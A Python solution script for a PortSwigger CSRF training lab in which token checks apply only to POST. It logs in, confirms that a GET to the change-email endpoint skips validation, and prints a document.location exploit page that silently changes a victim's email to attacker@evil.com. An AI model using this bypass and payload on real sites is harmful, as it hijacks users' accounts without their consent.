# Lab 02 — CSRF where token validation depends on request method
# PortSwigger: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method
#
# Vulnerability: Token validated on POST — GET bypasses validation entirely
# Aim:           Change the victim's email using a GET-based CSRF
#
# Technique:
#   A POST with a wrong token → 400 (token IS validated)
#   A GET to the same endpoint → 200 (token NOT validated)
#
#   This script:
#     1. Logs in, grabs the CSRF token, confirms POST validates it (wrong token → 400)
#     2. Confirms GET bypasses validation (no token needed)
#     3. Prints a GET-based exploit using document.location (top-level nav)
#
#   document.location triggers a top-level GET navigation — victim's browser
#   includes session cookies automatically (Lax default also permits this).
#
# Usage: python csrf_lab02.py <url>

import sys
import urllib3
from proxies import proxies
from csrf_utils import (banner, section, make_session, login,
                        get_account_page, get_csrf_from_response,
                        check_email_changed, print_box, print_exploit_steps)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TEST_EMAIL   = "wiener-changed@evil.com"
VICTIM_EMAIL = "attacker@evil.com"

if __name__ == "__main__":
    banner()
    section("LAB 02 — CSRF: TOKEN VALIDATION DEPENDS ON REQUEST METHOD")

    if len(sys.argv) != 2:
        print("  Usage: python csrf_lab02.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    r = get_account_page(session, url)
    token = get_csrf_from_response(r.text)

    # ── Step 1: confirm POST validates token ─────────────────────────────────
    print("\n  ── Step 1: confirm POST with wrong token is rejected\n")
    r_bad = session.post(
        f"{url}/my-account/change-email",
        data={"email": TEST_EMAIL, "csrf": "wrongtoken"},
        allow_redirects=True
    )
    if r_bad.status_code == 400 or "Invalid" in r_bad.text:
        print("  ✔  POST with wrong token → rejected (token IS validated on POST)")
    else:
        print(f"  ?  Unexpected response {r_bad.status_code} — check manually")

    # ── Step 2: confirm GET bypasses token check ─────────────────────────────
    print("\n  ── Step 2: confirm GET bypasses token validation\n")
    r_get = session.get(
        f"{url}/my-account/change-email",
        params={"email": TEST_EMAIL},
        allow_redirects=True
    )
    check_email_changed(r_get.text, TEST_EMAIL)

    # ── Step 3: print GET-based exploit ──────────────────────────────────────
    section("Step 3: Exploit HTML for the exploit server")

    exploit = f"""\
<script>
document.location = '{url}/my-account/change-email?email={VICTIM_EMAIL}';
</script>"""

    print_box("EXPLOIT SERVER BODY", exploit)
    print_exploit_steps()
    print()
    print("  ℹ  document.location is a top-level GET navigation.")
    print("     Lax cookies are sent on top-level navigations → no SameSite issue.")
    print("     Token check doesn't run for GET → email changes.")
